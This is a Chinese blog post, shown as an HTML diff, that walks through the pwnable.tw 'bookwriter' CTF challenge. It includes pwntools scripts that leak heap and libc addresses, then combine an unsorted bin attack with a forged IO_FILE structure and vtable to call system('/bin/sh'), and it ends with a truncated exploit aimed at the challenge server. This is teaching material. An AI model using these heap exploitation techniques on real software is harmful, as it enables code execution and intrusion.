@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="男票带我练CTF之bookwriter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之bookwriter">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="男票带我练CTF之bookwriter">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/bookwriter-1.png">
+<meta property="og:image" content="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/bookwriter-2.png">
+<meta property="article:published_time" content="2020-04-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-17T06:20:15.785Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/bookwriter-1.png"><title>pwnable.tw之bookwriter | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2020/04/04/bookwriter/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pwnable.tw之bookwriter</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-04-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#24" >题目链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>参考wp：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/" >【PWNABLE.TW】 BookWriter 解题思路</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-226694.htm" >Pwnable.tw之BookWriter</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="1-分析"   >
+          <a href="#1-分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-分析" class="headerlink" title="1 分析"></a>1 分析</h1>
+      <p>查看二进制各项属性：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file bookwriter</span></span><br><span class="line">bookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec bookwriter</span> </span><br><span class="line">[*] &#x27;/mnt/hgfs/vmshare-1604/bookwriter/bookwriter&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<ul>
+<li>64位二进制程序，动态链接，去了符号表</li>
+<li>got表不可写</li>
+<li>栈不可执行，开启栈canary</li>
+<li>地址随机化未开启</li>
+</ul>
+<p>使用IDA分析二进制源码逻辑，存在四个功能，分别是：</p>
+<ul>
+<li>add：添加page和内容</li>
+<li>view：查看page的内容</li>
+<li>edit：更改page的内容，并重新调整大小值size</li>
+<li>information：显示作者姓名</li>
+</ul>
+<p>漏洞点有以下几个：</p>
+<ul>
+<li>未进入while循环前输入作者姓名时，结束符控制有问题。导致后续打印该字符串时可越界读。</li>
+<li>add函数中的if(i&gt;8)判断有误，导致bss段原本存放size的位置可被覆盖为堆地址</li>
+<li>edit函数中同样存在第一个问题，在输入字符串时，结束符控制有问题，导致计算strlen时产生一个大于原本字符串的值，后续可以越界写。</li>
+</ul>
+
+        <h1 id="2-利用"   >
+          <a href="#2-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用" class="headerlink" title="2 利用"></a>2 利用</h1>
+      
+        <h2 id="2-1-泄露堆地址和libc基址"   >
+          <a href="#2-1-泄露堆地址和libc基址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1-泄露堆地址和libc基址" class="headerlink" title="2.1 泄露堆地址和libc基址"></a>2.1 泄露堆地址和libc基址</h2>
+      <p>泄露堆地址和libc测试代码：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">myelf&#x3D;ELF(&#39;.&#x2F;bookwriter&#39;)</span><br><span class="line">mylibc&#x3D;ELF(&#39;.&#x2F;libc_64.so.6&#39;)</span><br><span class="line">myproc&#x3D;process([&#39;.&#x2F;bookwriter&#39;], env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc_64.so.6&quot;&#125;)</span><br><span class="line"></span><br><span class="line">def add_page(p_size,p_content):</span><br><span class="line">    myproc.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">    myproc.sendline(str(1))</span><br><span class="line">    myproc.recvuntil(&quot;Size of page :&quot;)</span><br><span class="line">    myproc.sendline(str(p_size))</span><br><span class="line">    myproc.recvuntil(&quot;Content :&quot;)</span><br><span class="line">    myproc.send(p_content)</span><br><span class="line"></span><br><span class="line">def view_page(p_index):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    myproc.sendlineafter(&quot;Index of page :&quot;,str(p_index))</span><br><span class="line">#获取unsorted bin中第一个bin的top值</span><br><span class="line">    myproc.recvuntil(&quot;yuan&quot;)</span><br><span class="line">    top_addr &#x3D; u64(myproc.recvuntil(&quot;\n&quot;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">    return top_addr</span><br><span class="line"></span><br><span class="line">def edit_page(p_index,p_content):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    myproc.sendlineafter(&quot;Index of page :&quot;,str(p_index))</span><br><span class="line">    myproc.sendlineafter(&quot;Content:&quot;,p_content)</span><br><span class="line"></span><br><span class="line">def information(choice,p_author):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">#获取.bss段中author_name相邻的page指针，即堆地址</span><br><span class="line">    myproc.recvuntil(&quot;yuan&quot;)</span><br><span class="line">    ret &#x3D; u64(myproc.recvuntil(&quot;\n&quot;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">    myproc.sendlineafter(&quot;Do you want to change the author ? (yes:1 &#x2F; no:0) &quot;,str(choice))</span><br><span class="line">    if (choice &#x3D;&#x3D; 1):</span><br><span class="line">        myproc.sendlineafter(&quot;Author :&quot;,p_author)  </span><br><span class="line">    return ret</span><br><span class="line">    </span><br><span class="line">#泄露堆地址</span><br><span class="line">myproc.sendafter(&quot;Author :&quot;,&quot;a&quot;*60+&quot;yuan&quot;)     #构造64字节name，后续打印name会越界打印出堆地址</span><br><span class="line">add_page(0x18,&quot;b&quot;*0x18)      </span><br><span class="line">edit_page(0,&quot;c&quot;*0x18)    #计算size的时候会把top chunk的size字段也算进去，导致下一步可以多写3字节</span><br><span class="line">edit_page(0,&quot;\x00&quot;*0x18+&quot;\xe1\x0f\x00&quot;)    #将page0的内容改为空，则page0的size字段为空，可绕过add_page中对page[8]的检查。最后三个字节更改top chunk的大小，使其进入unsorted bin中，从而泄露top地址</span><br><span class="line">heap_addr &#x3D; information(0,0)    #获取page[0]上的堆地址</span><br><span class="line">log.warn(&quot;heap addr: 0x%x &quot; % heap_addr)</span><br><span class="line"></span><br><span class="line">#泄露libc</span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add_page(0x64,&quot;a&quot;*4+&quot;yuan&quot;)</span><br><span class="line">top_addr &#x3D; view_page(3)      # 除了第一个从unsorted bin中分配的堆块，无法获得top地址，其他都可</span><br><span class="line">log.warn(&quot;top_addr: 0x%x&quot; % top_addr)</span><br><span class="line">libc_base &#x3D; top_addr - 0x58 - 0x3c3b20    #通过top地址，计算libc基址。0x58可以在堆调试中看到,0x3c3b20是查看libc.so中malloc_trim函数中变量的偏移获取到的。</span><br><span class="line">log.warn(&quot;libc_base: 0x%x&quot; % libc_base)</span><br><span class="line"></span><br><span class="line">gdb.attach(myproc)</span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h2 id="2-2-get-shell"   >
+          <a href="#2-2-get-shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2-get-shell" class="headerlink" title="2.2 get shell"></a>2.2 get shell</h2>
+      <p>通过以上代码，已经可以实现往第0个堆上写超长数据，从而覆盖堆空间其他部分了。</p>
+<p>现在还需要解决几个问题：</p>
+<p>（1）通过unsortedbin attack将IO_list_all覆盖为我们可写的内存地址，从而伪造IO_FILE_plus结构体</p>
+<p>问题1：但是通过unsortedbin attack只能将IO_list_all覆盖为mainarena+0x58（64位），该空间是我们不可控的，且空间的条件内不满足执行_IO_OVERFLOW，因此会转去寻找chain这个地址。</p>
+<p>（2）此时chain的位置正好是small bin的区域，因此我们需要构造一个能控制的small bin chunk</p>
+<p>问题2：怎么获得这个可控制的small bin chunk呢？将unsorted bin chunk中的chunk大小改一下，改成small bin大小，这样从unsorted bin中拆下的chunk就会被链接到对应大小的small bin上。</p>
+<p>问题3：这个大小应该多大呢？根据（1）中chain的位置来确定，本题是0x60。</p>
+
+        <h3 id="unsorted-bin-attack"   >
+          <a href="#unsorted-bin-attack" class="heading-link"><i class="fas fa-link"></i></a><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3>
+      <p>参考ctf-wiki：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" >unsorted bin attack</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>利用该方法可以往任意地址写一个固定的值。本题中可以将main_arena+0x58的地址写到IO_list_all上（将IO_list_all - 0x10的地址放在unsorted chunk的bk处），从而将IO_FILE_plus转移。由于main_arena不满足条件，会继续转移。IO_FILE中chain的位置正好在0x60大小small bin的bk处。如下图，构造一个0x60大小的unsorted bin，malloc时会将该unsorted bin放到chunk(IO_FILE)位置。而unsorted bin chunk的大部分区域我们都可以通过堆溢出来任意写。</p>
+<p><img src="bookwriter-1.png"></p>
+
+        <h3 id="I-O-FILE"   >
+          <a href="#I-O-FILE" class="heading-link"><i class="fas fa-link"></i></a><a href="#I-O-FILE" class="headerlink" title="I/O FILE"></a>I/O FILE</h3>
+      <p>以上分析可知，我们现在需要在unsorted bin chunk里布局IO_FILE_plus结构体，有一些限制条件，在参考链接中有提及，这里不复述。因此，通过堆溢出在第0号堆块上布局如下：</p>
+<p><img src="bookwriter-2.png"></p>
+<p>按照如上构造后，在gef中调试打印如下：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x1c91010, size=0x20, flags=PREV_INUSE)</span><br><span class="line">    [0x0000000001c91010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class="line">gef➤  x/50gx 0x1c91010+0x390</span><br><span class="line">0x1c913a0:	0x0068732f6e69622f	0x0000000000000061</span><br><span class="line">0x1c913b0:	0x0000000000000000	0x00007f9ecc967510</span><br><span class="line">0x1c913c0:	0x0000000000000002	0x0000000000000003</span><br><span class="line">0x1c913d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c913e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c913f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91400:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91460:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x1c91470:	0x0000000000000000	0x0000000001c91480</span><br><span class="line">0x1c91480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91490:	0x0000000000000001	0x00007f9ecc5e7390</span><br><span class="line">0x1c914a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c914b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c914c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c914d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c914e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c914f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1c91520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gef➤  p *(struct _IO_FILE_plus*)0x1c913a0</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x6e69622f, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7f9ecc967510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, </span><br><span class="line">    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0x0, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0x0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x1c91480</span><br><span class="line">&#125;</span><br><span class="line">gef➤  p *(struct _IO_jump_t*)0x1c91480</span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0x0, </span><br><span class="line">  __dummy2 = 0x0, </span><br><span class="line">  __finish = 0x1, </span><br><span class="line">  __overflow = 0x7f9ecc5e7390 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="3-EXP"   >
+          <a href="#3-EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXP" class="headerlink" title="3 EXP"></a>3 EXP</h1>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">myelf&#x3D;ELF(&#39;.&#x2F;bookwriter&#39;)</span><br><span class="line">mylibc&#x3D;ELF(&#39;.&#x2F;libc_64.so.6&#39;)</span><br><span class="line">myproc&#x3D;remote(&quot;chall.pwnable.tw&quot;,10304)</span><br><span class="line">#myproc&#x3D;process([&#39;.&#x2F;bookwriter&#39;], env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc_64.so.6&quot;&#125;)</span><br><span class="line">#mylibc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&#39;)</span><br><span class="line">#myproc&#x3D;process(myelf.path)</span><br><span class="line"></span><br><span class="line">def add_page(p_size,p_content):</span><br><span class="line">    myproc.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">    myproc.sendline(str(1))</span><br><span class="line">    myproc.recvuntil(&quot;Size of page :&quot;)</span><br><span class="line">    myproc.sendline(str(p_size))</span><br><span class="line">    myproc.recvuntil(&quot;Content :&quot;)</span><br><span class="line">    myproc.send(p_content)</span><br><span class="line"></span><br><span class="line">def view_page(p_index):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    myproc.sendlineafter(&quot;Index of page :&quot;,str(p_index))</span><br><span class="line">    myproc.recvuntil(&quot;aaaaaaaa&quot;)</span><br><span class="line">    top_addr &#x3D; u64(myproc.recvuntil(&quot;\n&quot;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">    return top_addr</span><br><span class="line"></span><br><span class="line">def edit_page(p_index,p_content):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    myproc.sendlineafter(&quot;Index of page :&quot;,str(p_index))</span><br><span class="line">    myproc.sendlineafter(&quot;Content:&quot;,p_content)</span><br><span class="line"></span><br><span class="line">def information(choice,p_author):</span><br><span class="line">    myproc.sendlineafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">    myproc.recvuntil(&quot;yuan&quot;)</span><br><span class="line">    ret &#x3D; u64(myproc.recvuntil(&quot;\n&quot;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">    myproc.sendlineafter(&quot;Do you want to change the author ? (yes:1 &#x2F; no:0) &quot;,str(choice))</span><br><span class="line">    if (choice &#x3D;&#x3D; 1):</span><br><span class="line">        myproc.sendlineafter(&quot;Author :&quot;,p_author)  </span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">myproc.sendafter(&quot;Author :&quot;,&quot;a&quot;*60+&quot;yuan&quot;)</span><br><span class="line">add_page(0x18,&quot;b&quot;*0x18)</span><br><span class="line">edit_page(0,&quot;c&quot;*0x18)</span><br><span 